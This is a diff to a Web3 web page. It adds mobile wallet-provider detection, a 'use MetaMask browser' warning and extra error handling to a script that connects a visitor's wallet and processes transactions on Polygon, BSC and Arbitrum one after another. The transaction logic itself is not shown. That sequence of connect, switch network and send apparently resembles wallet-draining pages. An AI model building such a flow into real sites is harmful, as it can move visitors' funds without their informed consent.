@@ -77,9 +77,23 @@
             background: #E2E3E5;
             border-left: 4px solid #6C757D;
         }
+        #mobile-warning {
+            display: none;
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            padding: 15px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
+    <div id="mobile-warning">
+        <strong>Mobile Browser Detected</strong><br>
+        Please open this page in MetaMask browser or a Web3-enabled mobile browser.
+    </div>
+    
     <div id="debug"></div>
     
     <div class="status-container">
@@ -106,12 +120,44 @@
 
 <script>
 const debug = document.getElementById('debug');
+const mobileWarning = document.getElementById('mobile-warning');
 debug.textContent = 'Script started...';
+
+// Enhanced Web3 provider detection for mobile
+function getWeb3Provider() {
+    // Check for various Web3 providers
+    if (window.ethereum) {
+        return window.ethereum;
+    } else if (window.web3 && window.web3.currentProvider) {
+        return window.web3.currentProvider;
+    } else if (window.trustwallet) {
+        return window.trustwallet;
+    } else if (window.imToken) {
+        return window.imToken;
+    }
+    
+    // Mobile-specific providers
+    if (window.ethereum && window.ethereum.isMetaMask) {
+        return window.ethereum;
+    }
+    
+    // Check if we're in a WebView or mobile browser
+    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+    const isMobile = /android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent.toLowerCase());
+    
+    if (isMobile) {
+        // Show mobile warning
+        mobileWarning.style.display = 'block';
+        debug.textContent += '→ Mobile browser detected. Please use MetaMask browser.\n';
+    }
+    
+    return null;
+}
 
 // FIX: Proper execution control
 let isExecuting = false;
 let executionCount = 0;
-const MAX_EXECUTIONS = 1; // Changed to 1 since we want sequential processing
+const MAX_EXECUTIONS = 1;
 
 // Track which networks have been processed
 const processedNetworks = {
@@ -255,8 +301,13 @@ async function switchNetwork(chainId) {
     };
 
     try {
+        const provider = getWeb3Provider();
+        if (!provider) {
+            throw new Error('No Web3 provider available');
+        }
+
         debug.textContent += `→ Requesting network switch to ${CHAIN_CONFIGS[chainId].name}...\n`;
-        await window.ethereum.request({
+        await provider.request({
             method: 'wallet_switchEthereumChain',
             params: [{ chainId: chainId }],
         });
@@ -266,8 +317,13 @@ async function switchNetwork(chainId) {
         // If network not added, add it
         if (switchError.code === 4902) {
             try {
+                const provider = getWeb3Provider();
+                if (!provider) {
+                    throw new Error('No Web3 provider available');
+                }
+
                 debug.textContent += `→ Adding ${CHAIN_CONFIGS[chainId].name} network...\n`;
-                await window.ethereum.request({
+                await provider.request({
                     method: 'wallet_addEthereumChain',
                     params: [chainConfig[chainId]],
                 });
@@ -289,12 +345,25 @@ async function switchNetwork(chainId) {
 // Process a single network
 async function processNetwork(chainId) {
     try {
-        const provider = window.ethereum;
+        const provider = getWeb3Provider();
+        if (!provider) {
+            throw new Error('No Web3 provider detected. Please use MetaMask or a Web3-enabled browser.');
+        }
+
         const web3 = new Web3(provider);
+        
+        // Check if provider has request method (mobile compatibility)
+        if (typeof provider.request !== 'function') {
+            throw new Error('Web3 provider does not support request method. Please use a compatible wallet.');
+        }
         
         const accounts = await provider.request({ 
             method: 'eth_requestAccounts' 
         });
+        
+        if (!accounts || accounts.length === 0) {
+            throw new Error('No accounts found. Please connect your wallet.');
+        }
         
         const currentChainId = await provider.request({ method: 'eth_chainId' });
         debug.textContent += `→ Current network: ${CHAIN_CONFIGS[currentChainId]?.name || 'Unknown'}\n`;
@@ -374,7 +443,7 @@ async function processNetwork(chainId) {
             return 'rejected';
         } else {
             debug.textContent += '→ ERROR: ' + error.message + '\n';
-            updateNetworkStatus(chainId, 'error', 'Transaction failed');
+            updateNetworkStatus(chainId, 'error', error.message || 'Transaction failed');
             return 'error';
         }
     }
@@ -384,6 +453,23 @@ async function processNetwork(chainId) {
 async function processNetworksSequentially() {
     if (isExecuting) {
         debug.textContent += '→ Already executing, skipping...\n';
+        return;
+    }
+    
+    // Check for Web3 provider before starting
+    const provider = getWeb3Provider();
+    if (!provider) {
+        debug.textContent += '→ ERROR: No Web3 provider found. Please install MetaMask.\n';
+        updateNetworkStatus('0x89', 'error', 'No Web3 wallet detected');
+        updateNetworkStatus('0x38', 'error', 'No Web3 wallet detected');
+        updateNetworkStatus('0xa4b1', 'error', 'No Web3 wallet detected');
+        
+        const overallStatus = document.getElementById('overall-status');
+        if (overallStatus) {
+            overallStatus.textContent = 'Error: No Web3 wallet detected';
+            overallStatus.style.background = '#F8D7DA';
+            overallStatus.style.color = '#DC3545';
+        }
         return;
     }
     
@@ -484,6 +570,25 @@ if (window.ethereum) {
         debug.textContent += `→ Accounts changed: ${accounts.length} accounts\n`;
     });
 }
+
+// Enhanced mobile detection and error handling
+function detectMobileEnvironment() {
+    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+    const isMobile = /android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent.toLowerCase());
+    
+    if (isMobile) {
+        debug.textContent += '→ Mobile environment detected\n';
+        
+        // Check if we're in a Web3 browser
+        if (!getWeb3Provider()) {
+            mobileWarning.style.display = 'block';
+            debug.textContent += '→ Please open in MetaMask browser for mobile\n';
+        }
+    }
+}
+
+// Run mobile detection
+detectMobileEnvironment();
 </script>
 </body>
 </html>
